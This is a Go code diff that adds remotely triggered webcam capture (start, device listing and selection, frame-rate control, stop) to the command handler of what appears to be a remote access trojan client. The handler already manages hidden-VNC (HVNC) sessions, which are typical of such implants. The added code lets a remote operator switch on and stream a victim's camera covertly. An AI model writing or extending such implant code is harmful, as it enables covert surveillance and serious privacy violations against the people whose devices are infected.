@@ -82,6 +82,18 @@ func resetForReconnect(env *runtime.Env) {
 	env.HVNCSelectedDisplay = 0
 	env.HVNCMu.Unlock()
 
+	env.WebcamMu.Lock()
+	if env.WebcamCancel != nil {
+		env.WebcamCancel()
+	}
+	waitStreamStop(env.WebcamDone, "webcam")
+	env.WebcamCancel = nil
+	env.WebcamDone = nil
+	env.WebcamDeviceIndex = 0
+	env.WebcamFPS = 30
+	env.WebcamUseMaxFPS = false
+	env.WebcamMu.Unlock()
+
 	if env.Console != nil {
 		env.Console.StopAll()
 	}
@@ -1261,6 +1273,97 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, err.Error())
 			return nil
 		}
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+
+	case "webcam_start":
+		env.WebcamMu.Lock()
+		if env.WebcamCancel != nil {
+			env.WebcamCancel()
+			waitStreamStop(env.WebcamDone, "webcam")
+		}
+		webcamCtx, cancel := context.WithCancel(ctx)
+		env.WebcamCancel = cancel
+		done := make(chan struct{})
+		env.WebcamDone = done
+		goSafe("webcam stream", env.Cancel, func() {
+			log.Printf("webcam: start requested")
+			_ = WebcamStart(webcamCtx, env)
+			close(done)
+		})
+		env.WebcamMu.Unlock()
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "webcam_list":
+		devices, err := capture.ListWebcams()
+		if err != nil {
+			sendCommandResultSafe(env, cmdID, false, err.Error())
+			return nil
+		}
+		out := make([]wire.WebcamDevice, 0, len(devices))
+		for _, dev := range devices {
+			out = append(out, wire.WebcamDevice{Index: dev.Index, Name: dev.Name, MaxFPS: dev.MaxFPS})
+		}
+		_ = wire.WriteMsg(ctx, env.Conn, wire.WebcamDevices{Type: "webcam_devices", Devices: out, Selected: env.WebcamDeviceIndex})
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "webcam_select":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		index := 0
+		if payload != nil {
+			if n, ok := payloadInt(payload, "index"); ok {
+				index = n
+			}
+		}
+		env.WebcamDeviceIndex = index
+		capture.CleanupWebcam()
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "webcam_set_fps":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		env.WebcamMu.Lock()
+		isStreaming := env.WebcamCancel != nil
+		env.WebcamMu.Unlock()
+		if isStreaming {
+			sendCommandResultSafe(env, cmdID, false, "stop webcam before changing fps")
+			return nil
+		}
+		fps := env.WebcamFPS
+		useMax := env.WebcamUseMaxFPS
+		if payload != nil {
+			if n, ok := payloadInt(payload, "fps"); ok {
+				fps = n
+			}
+			if v, ok := payload["useMax"].(bool); ok {
+				useMax = v
+			}
+		}
+		if fps < 1 {
+			fps = 30
+		}
+		if fps > 120 {
+			fps = 120
+		}
+		clampedFPS, clampErr := capture.ClampWebcamFPS(env.WebcamDeviceIndex, fps, useMax)
+		if clampErr != nil {
+			log.Printf("webcam: fps clamp fallback requested=%d err=%v", fps, clampErr)
+		} else {
+			fps = clampedFPS
+		}
+		env.WebcamFPS = fps
+		env.WebcamUseMaxFPS = useMax
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "webcam_stop":
+		env.WebcamMu.Lock()
+		log.Printf("webcam: stop requested")
+		if env.WebcamCancel != nil {
+			env.WebcamCancel()
+		}
+		waitStreamStop(env.WebcamDone, "webcam")
+		env.WebcamCancel = nil
+		env.WebcamDone = nil
+		env.WebcamMu.Unlock()
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 
